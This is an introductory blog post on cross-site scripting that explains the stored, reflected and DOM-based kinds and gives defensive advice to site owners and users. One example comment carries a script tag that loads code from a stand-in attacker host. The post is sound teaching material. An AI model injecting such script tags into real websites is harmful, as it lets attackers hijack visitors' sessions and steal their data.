---
layout: post
permalink: security/cross-site-scripting-attack
title: 'Cross Site Scripting Attack'
excerpt: 'In this article, we are going to discover the Cross Site Scripting Attack and how to protect our application from this attack'
tags: security
---

## Introduction

XSS (Cross Site Scripting) Attacks occurs when attackers inject malicious script into the content of the targeted website, which is then executed by the victim's browser as it is impossible for the browser to differentiate the valid scripts from those of the hacker.

Therefore, these malicious scripts can access cookies, session tokens or other sensitive information stored by the browser and used on this site. Unlike other online attacks, XSS attacks do not directly target the application itself, but rather its users.

## How does it work ?

Consider a website that allows `<script>` tags to be embedded in its comments section. Those tags become a permanent part of the page causing the browser to include them with the rest of the website scripts each time the page is loaded. The attacker can then add a comment where he can include his script in the website :

> Very nice article. It really helped me Thank you!<br/><code><script src=”http://attackersite.com/maliciousscript.js”></script></code>

After that, each time a user accesses this page, the malicious script will be loaded. With this technique, the attacker can compromise the user's account and have access to their personal and financial data, while the user will not notice anything and probably not even navigated to the website comments section. This type of attack is called **Stored XSS Attack** and in the following section, we are going to learn more about the XSS attacks types

## XSS Attacks Types

XSS Attacks can be classified into three main categories: Stored XSS Attacks, Reflected XSS Attacks and DOM-based XSS Attacks.

### Stored XSS Attacks

A Stored or Persistent XSS is considered the most devastating cross-site scripting attack. An attacker inject malicious content (most often JavaScript code) into the target website. For example, the attacker may enter his malicious script into a blog comment or in a forum post. If there is no input validation, this code is permanently stored by the website and each time a user opens the affected website page, the malicious script is executed. This type of XSS attacks are more difficult to execute due to the difficulty of finding both a popular website with vulnerabilities that allow scripts to be permanently embedded.

### Reflected XSS Attacks

Reflected XSS attacks are the most common cross-site scripting attack. In this case, the attacker's malicious code must be part of the request sent to the web server which then return it in its response. Attackers use malicious links, phishing emails and other social engineering techniques to trick victims into making a request to the server. The malicious code is then executed in the user's browser. Since this is not a persistent attack, the attacker must deliver the malicious code to each victim. These attacks are often carried out using social networks.

### DOM-based XSS Attacks

DOM-based XSS attacks refers to a cross-site scripting flaw that appears in the DOM (Document Object Model) instead of being in part of the HTML source code. This type of attack usually happens on the client side and the malicious code is never sent to the server. This makes detection even more difficult for firewalls and security engineers as they never see the malicious code. The DOM objects that are most often manipulated are the page URL `document.URL`, the anchor part of the URL `location.hash` and the page referrer `document.referrer`.

## How to defend against it ?

<p class="mb-0 mt-1">To limit XSS vulnerabilities, website owners should :</p>

- Ensure that all their website pages that accept user input handle correctly code input such as HTML and JavaScript tags.
- Update their website and server software to prevent future exploitation of vulnerabilities that could be targeted by an XSS attack.
- Scan for web application vulnerabilities and apply necessary patches.

<p class="mb-0 mt-1">To avoid falling victim to an XSS attack, users should :</p>

- Disable scripts on pages where they are not needed.
- Keep their browser up to date to benefit from the latest bug and security fixes.
- Avoid clicking on links from emails or posts on a suspicious forum, which could redirect to corrupted pages.

## Conclusion

In this article, we have discovered how the Cross Site Scripting Attack and how to protect our web applications from this attack we hope you find it useful :)
